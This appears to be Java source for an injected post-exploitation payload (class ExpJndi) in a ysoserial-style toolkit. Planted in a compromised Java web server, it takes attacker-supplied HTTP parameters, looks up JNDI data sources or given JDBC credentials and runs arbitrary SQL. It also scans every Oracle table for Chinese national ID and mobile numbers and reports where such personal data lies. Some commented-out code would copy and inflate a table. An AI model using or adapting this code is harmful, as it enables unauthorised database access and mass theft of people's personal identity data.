package ysoserial.payloads.util;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.naming.Binding;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingEnumeration;
import javax.naming.NamingException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import javax.sql.DataSource;

public class ExpJndi {

	PageContext pageContext;
	HttpServletRequest request;
	HttpServletResponse response;
	OutputStream out;
	HttpSession session;
	List<Map<String, String>> lm = null;
	boolean bShowErr  = false;

	public void print(byte []a)
	{
		try {
			if (null != out && null != a)
				out.write(a);
		} catch (Exception e) {
		}
	}
	public void print(String s) {
		try {
			if (null != s)
				print(s.getBytes("utf-8"));// "ISO-8859-1"
		} catch (Exception e) {
		}
	}

	public ExpJndi() {
	}

	private String szCol = "\t";

	public void doPreparedStatement(PreparedStatement p) {
		ResultSet rs = null;
		ResultSetMetaData rsmd = null;
		boolean bAdd = null != lm;
		try {
//			if(null == p)print("PreparedStatement is null");
//			else print("PreparedStatement is ok");
			rs = p.executeQuery();
			if (null != rs) {
//				print("rs is ok");
				// 获得列信息
				rsmd = rs.getMetaData();
				int nCol = rsmd.getColumnCount();
				String[] szACol = new String[nCol];
				int i = 0, x = 1;
				print("\n");
				for (; i < nCol; i++, x++) {
					if (0 < i)
						print(szCol);
					print(rsmd.getColumnName(x));
					szACol[i] = rsmd.getColumnName(x);
				}
				print("\n");

				Map<String, String> mT = null;
				while (rs.next()) {
					if (bAdd) {
						mT = new HashMap<String, String>();
					}
					for (i = 0; i < nCol; i++) {
						try {
							if (0 < i)
								print(szCol);
							String szT = rs.getString(szACol[i]);
							if (null == szT)
								szT = "";
							print(szT);
							if (bAdd) {
								mT.put(szACol[i], szT);
							}
						} catch (Exception e) {
							log(e);
						}
					}
					if (bAdd) {
						lm.add(mT);
					}
					print("\n");
					if(0 >= nBreak--)
						break;
				}
				out.flush();
			}
//			else print("rs is null");
		} catch (Exception e) {
			log(e);
		} catch (Throwable e) {
			log(e);
		} finally {
			if (null != rs)
				try {
					rs.close();
				} catch (Throwable e) {
					log(e);
				}

		}
	}

	Connection connection = null;
	String szLstColsNames = "";

	/**
	 * 用于敏感信息的收集
	 * 
	 * @param sql
	 * @return
	 * @throws Exception
	 */
	public String getOneLine(String sql) {
		StringBuffer buf = new StringBuffer();
		ResultSet rs = null;
		ResultSetMetaData rsmd = null;
		try {
			PreparedStatement p = null;
			if (null != connection && null != sql) {
				p = connection.prepareStatement(sql);
				rs = p.executeQuery();
				szLstColsNames = "";
				if (null != rs) {
					// 获得列信息
					rsmd = rs.getMetaData();
					int nCol = rsmd.getColumnCount();
					String[] szACol = new String[nCol];
					int i = 0, x = 1;
					for (; i < nCol; i++, x++) {
						szACol[i] = rsmd.getColumnName(x);
						szLstColsNames += ","+szACol[i];
					}
					while (rs.next()) {
						for (i = 0; i < nCol; i++) {
							try {
//								String szT = rs.getString(szACol[i]);
								String szT = new String(rs.getBytes(szACol[i]),"UTF-8");
								
								if (null == szT)
									szT = "";
//								szT = new String(szT.getBytes(),"utf-8");
								buf.append(szACol[i]).append(":").append(szT).append(";");
							} catch (Exception e) {
								log(e);
							}

						}
						break;
					}
					out.flush();
				}
			}
		} catch (Exception e) {
			log(e);
		} catch (Throwable e) {
			log(e);
		} finally {
			if (null != rs)
				try {
					rs.close();
				} catch (Throwable e) {
					log(e);
				}
		}

		return buf.toString();
	}

	public void doSql(String sql) throws Exception {
		PreparedStatement prep = null;
		if (null != connection && null != sql) {
			prep = connection.prepareStatement(sql);
			doPreparedStatement(prep);
		}
	}

	public void doCount() throws Exception {
		lm = new ArrayList<Map<String,String>>();
		doSql("select owner,TABLE_NAME,NUM_ROWS from all_tables where NUM_ROWS >6 order by num_rows desc");
		int j = 0;
		if(0 < (j = lm.size()))
		{
			Map <String,String>mT = null;
			String sT;
			String regularExpression = "(\\b[0-9]{17}[0-9xX])\\b";//"(^[1-9]\\d{5}(18|19|20)\\d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\\d{3}[0-9Xx]$)|(^[1-9]\\d{5}\\d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\\d{3}$)";
			String shouji = "(\\b[0-9]{11})\\b";
			int nCnt = 0;
	        
			Pattern p1 = Pattern.compile(regularExpression),p2 = Pattern.compile(shouji);
			Matcher m1,m2;
			String szSq,szFstTb = "",szFstTbn = "",szMgb = "";
			boolean bFst = true;
			for(int i = 0; i < j;i++)
			{
				mT = lm.get(i);
				if(null != mT.get("TABLE_NAME") && null != mT.get("OWNER"))
				{
					sT = getOneLine(szSq = "select * from " + mT.get("OWNER") + "." + mT.get("TABLE_NAME"));
					if(null != sT && 18 < sT.length())
					{
						m1 = p1.matcher(sT);
						m2 = p2.matcher(sT);
						if(null != m1 && m1.find() && null != m2 && m2.find())
						{
//							print("\n("+mT.get("NUM_ROWS")+")"+szSq+"\n");// + sT
							nCnt += Integer.parseInt(mT.get("NUM_ROWS"));
							if(bFst)
							{
								bFst = false;
								szFstTbn =  mT.get("OWNER") + "." + mT.get("TABLE_NAME");
								szFstTb = szLstColsNames;
//								print((szFstTb = szLstColsNames) + "\n");
							}
							szMgb += mT.get("OWNER") + "." + mT.get("TABLE_NAME") + "(" + mT.get("NUM_ROWS") + ");  ";
						}
					}
				}
			}
			print("\n敏感信息累计：" + nCnt);
			print("\n敏感信息表分布：" + szMgb + "\n");
			String szSql1 = "";
//			if(0 < szFstTbn.length())
//			{
//				szFstTbn = szFstTbn.substring(1);
//	//			for(int i = 0; i < 18; i++)
//	//			{
//					szSql1 = "CREATE TABLE " + szFstTbn +"_A  AS SELECT * FROM " + szFstTbn;
//					print(szSql1);
//					doSql(szSql1);
//	//			}
//				for(int i = 0; i < 6; i++)
//				{
//					doSql(szSql1 = "INSERT INTO " + szFstTbn + "_A(" + szFstTb + ")\" SELECT " + szFstTb + " FROM " + szFstTbn);
//				}
//				print(szSql1);
//				print(getOneLine("select count(1) as a from "+ szFstTbn + "_A"));
//			}
		}
	}
	private int nBreak = Integer.MAX_VALUE;
	private String jdbc_drv = null;
	private String jdbc_url = null;
	private String jdbc_u = null;
	private String jdbc_p = null;
	public void c() throws Exception {
		String sql = request.getParameter("s"), jds = request.getParameter("j"), c1 = request.getParameter("col");
		jdbc_drv = request.getParameter("jdbc_drv");
		if(null == jdbc_drv)jdbc_drv = "oracle.jdbc.OracleDriver";
		jdbc_url = request.getParameter("jdbc_url");
		jdbc_u = request.getParameter("jdbc_u");
		jdbc_p = request.getParameter("jdbc_p");
		if(null != request.getParameter("nBreak"))
			nBreak = Integer.parseInt(request.getParameter("nBreak"));
		if (null == jds) {
			jds = getJndiName();
			if (null == jds) {
				return;
			}
			jds = jds.trim();
		}
		if (null != c1)
			szCol = c1;
		getConnection(jds);
		if (null == sql || 10 > sql.length()) {
			doCount();
		} else
			doSql(sql);
	}

	public ArrayList<String> listContext(Context ctx, String indent, ArrayList<String> output) throws NamingException {
		String name = "";
		try {
			NamingEnumeration list = ctx.listBindings("");
			while (list.hasMore()) {
				Binding item = (Binding) list.next();
				String className = item.getClassName();
				name = item.getName();
				if (!(item.getObject() instanceof DataSource)) {
				} else {
					output.add(indent + name);
				}
				Object o = item.getObject();
				if (o instanceof javax.naming.Context) {
					listContext((Context) o, indent + name + "/", output);
				}
			}
		} catch (NamingException ex) {
			log(ex);
		}
		return output;
	}

	public String getJndiName() {
		try {
//			Properties p = System.getProperties();
//			String szT3 = null;
//			String[] a = new String[] { "ADMIN_URL", "weblogic.management.server" };
//			// java.naming.factory.initial="weblogic.jndi.WLInitialContextFactory"
//			// user.name="weblogic"
//			// webapp.root rednetnew.root
//			for (int i = 0; i < a.length; i++) {
//				szT3 = p.getProperty(a[i]);
//				if (null != szT3) {
//					break;
//				}
//			}
//			if (null != szT3) 
			{
//				Hashtable myCtx = new Hashtable();
//				szT3 = szT3.replaceAll("^http[s]*", "t3");
//				szT3 = szT3.replaceAll("\\/[^:]+:", "//127.0.0.1:");
//				myCtx.put(Context.INITIAL_CONTEXT_FACTORY, "weblogic.jndi.WLInitialContextFactory");
//				myCtx.put(Context.PROVIDER_URL, szT3);
//				print(szT3);
//				Context ctx = new InitialContext(myCtx);
				InitialContext ctx = new InitialContext();
				ArrayList<String> tab = new ArrayList<String>();
//				tab = listContext((Context) ctx.lookup("jdbc"), "jdbc/", tab);
				tab = listContext((Context) ctx.lookup(""), "", tab);
//				log("jndi name size:" + tab.size());
				if (0 < tab.size()) {
					return tab.get(0);
				}
			}
		} catch (Exception e) {
			log(e);
		}

		return null;
	}

	public boolean equals(Object obj) {
		if (obj instanceof PageContext)
			try {
				pageContext = (PageContext) obj;
				request = (HttpServletRequest) pageContext.getRequest();
				response = (HttpServletResponse) pageContext.getResponse();
				out = response.getOutputStream();
				session = request.getSession(false);
				String c1 = request.getParameter("c");
				if (null == session)
					session = request.getSession(true);
				if (null != c1) {
					if (null != session)
						session.setAttribute("c", c1);
					pageContext.getServletContext().setAttribute("_c_", c1);
				}
				response.reset();
				response.setContentType("text/html; charset=utf-8");
				if(null != request.getParameter("es"))
					bShowErr = true;
				c();
			} catch (Exception e) {
				log(e);
			} finally {
				if (null != connection)
					try {
						connection.close();
					} catch (Throwable e) {
						log(e);
					}
			}

		return false;
	}

	public void log(Throwable e) {
		if (bShowErr && null != response)
			try {
				if (null != e)
				{
					ByteArrayOutputStream out1 = new ByteArrayOutputStream(); 
					e.printStackTrace(new PrintWriter(out1));
					print(out1.toByteArray());
				}
//				e.printStackTrace(response.getWriter());
			} catch (Exception e1) {
			}
	}

	public Connection getConnection(String s) {
		if (connection == null)
			try {
				InitialContext context = new InitialContext();
				DataSource dataSource = (DataSource) context.lookup(s);
				connection = dataSource.getConnection();
				connection.setAutoCommit(false);
			} catch (Exception e) {
				log(e);
			}
		if (null == connection) {
			if(null != jdbc_url && null != jdbc_u && null != jdbc_p)
			try {
				if(null != jdbc_drv)
					Class.forName(jdbc_drv);
				connection = DriverManager.getConnection(jdbc_url,jdbc_u,jdbc_p);
			} catch (Exception e) {
				log(e);
			}
			if (null == connection) print("[" + s + "]");
		}
		return connection;
	}
}
